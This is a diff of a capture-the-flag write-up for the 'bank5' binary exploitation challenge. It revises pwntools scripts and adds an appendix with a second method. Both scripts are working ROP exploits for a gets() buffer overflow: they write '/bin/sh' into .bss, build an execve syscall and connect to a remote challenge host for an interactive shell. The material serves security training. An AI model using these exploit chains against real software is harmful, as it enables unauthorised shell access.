@@ -8,7 +8,7 @@ nc 61.28.237.24 30206
 author: xikhud
 ```
 
-Decompiling `bank5` with IDA, we see that `getFlag` no longer exists. NX is also enabled, so we can not inject shellcode. However, as `bank5` is not PIE and uses gets (which accepts null bytes) to read our input, we can easily exploit the buffer overflow using ROP.
+Decompiling `bank5` with IDA, we see that `getFlag` no longer exists. NX is also enabled, so we can not inject shellcode. However, as `bank5` doesn't have PIE enabled and uses gets (which accepts null bytes) to read our input, we can use ROP.
 
 ![](checksec.png)
 
@@ -32,36 +32,34 @@ POP_EDX_ADDR = 0x0806dfab  # pop edx ; ret
 POP_ECX_EBX_ADDR = 0x0806dfd2  # pop ecx ; pop ebx ; ret
 MOV_EDX_INTO_EAX_ADDR = 0x0809cd34  # mov dword ptr [eax], edx ; ret
 SAFE_ADDR = 0x080da320  # .bss section
-EXEC = "/bin/sh\x00"
+EXEC = '/bin/sh\x00'
 EXEC = [EXEC[:4], EXEC[4:]]
 
 def write_mem(value, addr):
   if type(value) == int:
-    value = pack(value)
+    value = p32(value)
   if type(value) == str:
     value = value.encode('utf-8')
-  payload = pack(POP_EDX_ADDR) + value
-  payload += pack(POP_EAX_ADDR) + pack(addr)
-  payload += pack(MOV_EDX_INTO_EAX_ADDR)
+  payload = p32(POP_EDX_ADDR) + value
+  payload += p32(POP_EAX_ADDR) + p32(addr)
+  payload += p32(MOV_EDX_INTO_EAX_ADDR)
   return payload
 
 # Write EXEC into SAFE_ADDR
-payload = b"A" * 80  # padding
+payload = b'A' * 80  # padding
 payload += write_mem(EXEC[0], SAFE_ADDR)
 payload += write_mem(EXEC[1], SAFE_ADDR + 4)
 
 # Populate registers for the syscall
-payload += pack(POP_EAX_ADDR) + pack(11)
-payload += pack(POP_ECX_EBX_ADDR) + pack(0) + pack(SAFE_ADDR)
-payload += pack(POP_EDX_ADDR) + pack(0)
+payload += p32(POP_EAX_ADDR) + p32(11)
+payload += p32(POP_ECX_EBX_ADDR) + p32(0) + p32(SAFE_ADDR)
+payload += p32(POP_EDX_ADDR) + p32(0)
 
 # Syscall
-payload += pack(INT_0x80_ADDR)
-print(payload.hex())
+payload += p32(INT_0x80_ADDR)
 
 conn = remote('61.28.237.24', 30206)
 conn.sendline(payload)
-conn.recv()
 conn.interactive()
 ```
 
@@ -79,3 +77,39 @@ HCMUS-CTF{rop_and_shellcode}
 ```
 
 **Flag:** `HCMUS-CTF{rop_and_shellcode}`
+
+### Appendix
+
+We can also call `gets` to write `/bin/sh`.
+
+```py
+from pwn import *
+
+elf = ELF('bank5')
+
+GETS_ADDR = elf.symbols['gets']
+INT_0x80_ADDR = 0x08049553  # int 0x80
+POP_EAX_ADDR = 0x0809d514  # pop eax ; ret
+POP_EDX_ADDR = 0x0806dfab  # pop edx ; ret
+POP_ECX_EBX_ADDR = 0x0806dfd2  # pop ecx ; pop ebx ; ret
+SAFE_ADDR = 0x080da320  # .bss section
+
+# Use gets to write "/bin/sh" to SAFE_ADDR
+payload = b'A' * 80  # padding
+payload += p32(GETS_ADDR)
+payload += p32(POP_EAX_ADDR)
+payload += p32(SAFE_ADDR)
+
+# Populate registers for the syscall
+payload += p32(POP_EAX_ADDR) + p32(11)
+payload += p32(POP_ECX_EBX_ADDR) + p32(0) + p32(SAFE_ADDR)
+payload += p32(POP_EDX_ADDR) + p32(0)
+
+# Syscall
+payload += p32(INT_0x80_ADDR)
+
+conn = remote('61.28.237.24', 30206)
+conn.sendline(payload)
+conn.sendline('/bin/sh\x00')
+conn.interactive()
+```
